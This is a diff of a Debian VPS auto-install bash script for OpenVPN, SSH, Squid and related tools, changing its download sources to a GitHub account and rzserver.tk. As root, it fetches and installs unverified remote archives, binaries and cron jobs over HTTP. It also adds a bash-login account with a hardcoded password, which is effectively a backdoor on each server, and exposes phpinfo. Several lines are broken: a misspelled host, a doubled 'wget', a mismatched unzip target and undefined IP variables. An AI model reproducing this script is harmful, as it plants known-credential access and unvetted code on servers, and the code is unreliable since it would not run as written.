@@ -62,43 +62,30 @@ rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
 wget -O /etc/nginx/nginx.conf "http://zakidotmy.5gbfree.com/debian32/nginx.conf"
 mkdir -p /home/vps/public_html
-echo "<pre>Setup by Kiellez</pre>" > /home/vps/public_html/index.html
+echo "<pre>Setup by MuLuu09</pre>" > /home/vps/public_html/index.html
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
 wget -O /etc/nginx/conf.d/vps.conf "http://zakidotmy.5gbfree.com/debian32/vps.conf"
 sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
 service php5-fpm restart
 service nginx restart
 
-# install openvpn
-wget -O /etc/openvpn/openvpn.tar "http://zakidotmy.5gbfree.com/debian32/openvpn.tar"
+# openvpn
+apt-get -y install openvpn
 cd /etc/openvpn/
-tar xf openvpn.tar
-wget -O /etc/openvpn/1194.conf "http://zakidotmy.5gbfree.com/debian32/1194-debian.conf"
-service openvpn restart
-sysctl -w net.ipv4.ip_forward=1
-sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
+wget http://raw.github.com/MuLuu09/debian/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
 wget -O /etc/iptables.up.rules "http://zakidotmy.5gbfree.com/debian32/iptables.up.rules"
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
-MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | grep -v '192.168'`;
-MYIP2="s/xxxxxxxxx/$MYIP/g";
-sed -i 's/port 1194/port 6500/g' /etc/openvpn/1194.conf
-sed -i $MYIP2 /etc/iptables.up.rules;
+sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
 iptables-restore < /etc/iptables.up.rules
-service openvpn restart
-
-# configure openvpn client config
-cd /etc/openvpn/
-wget -O /etc/openvpn/1194-client.ovpn "http://zakidotmy.5gbfree.com/debian32/1194-client.conf"
-sed -i $MYIP2 /etc/openvpn/1194-client.ovpn;
-sed -i 's/1194/6500/g' /etc/openvpn/1194-client.ovpn
-NAME=`uname -n`.`awk '/^domain/ {print $2}' /etc/resolv.conf`;
-mv /etc/openvpn/1194-client.ovpn /etc/openvpn/$NAME.ovpn
-useradd -M -s /bin/false jackdotmy
-echo "jackdotmy:jack123456" | chpasswd
-tar cf client.tar $NAME.ovpn
-cp client.tar /home/vps/public_html/
-cd
-
+# etc
+wget -O /home/vps/public_html/client.ovpn "http://raw.github.com/MuLuu09/debian/master/client.ovpn"
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn;cd
+wget http://rzserver.tk/source/cronjob.tar
+tar xf cronjob.tar;mv uptimes.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash MuLuu09
+echo "MuLuu09:muluu" | chpasswd
 # setting port ssh
 sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
 sed -i 's/Port 22/Port  22/g' /etc/ssh/sshd_config
@@ -133,9 +120,8 @@ service fail2ban restart
 
 # install squid3
 apt-get -y install squid3
-wget -O /etc/squid3/squid.conf "http://zakidotmy.5gbfree.com/debian32/squid.conf"
+wget -O /etc/squid3/squid.conf "http://raw.github.com/MuLuu09/conf/master/squid.conf"
 sed -i $MYIP2 /etc/squid3/squid.conf;
-service squid3 restart
 
 # install webmin
 cd
@@ -149,13 +135,13 @@ service vnstat restart
 
 # User Status
 cd
-wget http://zakidotmy.5gbfree.com/debian32/user-list
+wget http://raw.github.com/MuLuu09/conf/master/user-list
 mv ./user-list /usr/local/bin/user-list
 chmod +x /usr/local/bin/user-list
 
 # Install Dos Deflate
 apt-get -y install dnsutils dsniff
-wget http://zakidotmy.5gbfree.com/debian32/ddos-deflate-master.zip
+wget http://raw.github.com/MuLuu09/autoscript/master/ddos-deflate-master.zip
 unzip master.zip
 cd ddos-deflate-master
 ./install.sh
@@ -163,24 +149,24 @@ cd
 
 # Install SSH autokick
 cd
-wget http://zakidotmy.5gbfree.com/debian32/Autokick-debian.sh
+wget http://raw.github.com/MuLuu09/conf/master/Autokick-debian.sh
 bash Autokick-debian.sh
 
 
 # Install Monitor
 cd
-wget http://zakidotmy.5gbfree.com/debian32/monssh; mv monssh /usr/local/bin/; chmod +x /usr/local/bin/monssh
+wget http://aw.github.com/MuLuu09/conf/master/monssh; mv monssh /usr/local/bin/; chmod +x /usr/local/bin/monssh
 
 
 # Install Menu
 cd
-wget http://zakidotmy.5gbfree.com/debian32/menu
+wget http://raw.github.com/MuLuu09/conf/master/menu
 mv ./menu /usr/local/bin/menu
 chmod +x /usr/local/bin/menu
 
 # moth
 cd
-wget wget http://zakidotmy.5gbfree.com/debian32/motd
+wget wget http://raw.github.com/MuLuu09/conf/master/motd
 mv ./motd /etc/motd
 
 # Restart Service
@@ -201,8 +187,8 @@ rm debian32.sh
 
 # info
 clear
-echo "Setup by En Jack Bin Melayu"
-echo "OpenVPN  : TCP 1194 (client config : http://$MYIP:81/client.tar)"
+echo "Setup by MuLuu09"
+echo "OpenVPN  : TCP 1194 (client config : http://$MYIP:81/client.ovpn)"
 echo "OpenSSH  : 22, 143"
 echo "Dropbear : 109, 110, 443"
 echo "Squid3   : 8080 (limit to IP SSH)"
